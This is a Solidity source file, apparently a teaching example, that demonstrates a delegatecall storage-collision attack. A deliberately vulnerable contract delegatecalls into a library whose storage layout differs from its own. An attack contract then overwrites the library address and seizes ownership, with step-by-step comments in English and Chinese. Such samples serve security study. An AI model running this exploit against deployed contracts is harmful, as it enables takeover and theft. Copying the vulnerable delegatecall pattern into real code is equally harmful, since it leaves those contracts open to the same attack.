// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract DelegatecallLib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract DelegatecallHackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract DelegatecallAttack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public someNumber;

    DelegatecallHackMe public hackMe;

    constructor(DelegatecallHackMe _hackMe) {
        hackMe = DelegatecallHackMe(_hackMe);
    }

    function attack() public {
        // 地址无法直接转uint256, 先转成uint160 20bytes = uint160
        // override address of lib 第1次攻击更改逻辑合约地址为本合约 通过本合约的行为改变 HackMe合约的变量
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
